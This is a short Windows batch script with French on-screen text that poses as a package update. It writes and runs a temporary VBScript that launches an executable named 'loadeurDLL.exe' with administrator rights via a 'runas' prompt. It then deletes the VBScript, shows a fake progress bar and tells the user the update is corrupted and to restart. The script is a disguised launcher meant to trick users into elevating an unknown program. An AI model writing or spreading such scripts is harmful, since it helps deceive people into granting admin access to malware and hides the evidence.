@echo off
echo mise a jour des packets....
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\GetAdmin.vbs"
echo UAC.ShellExecute "loadeurDLL.exe", "", "", "runas", 1 >> "%temp%\GetAdmin.vbs"
"%temp%\GetAdmin.vbs"
del "%temp%\GetAdmin.vbs"

setlocal enabledelayedexpansion

echo      [ Veuillez patienter... ]
echo.

set "progress=          "   REM 10 espaces vides pour la barre de chargement

for /L %%i in (1,1,10) do (
    set "progress=!progress!#"
    cls
    echo Veuillez patienter...
    echo.
    echo [!progress!]
    timeout /t 1 /nobreak >nul
)

echo.
echo mise a jour corrempue redemarer votre pc puis resseyer
pause >nul


exit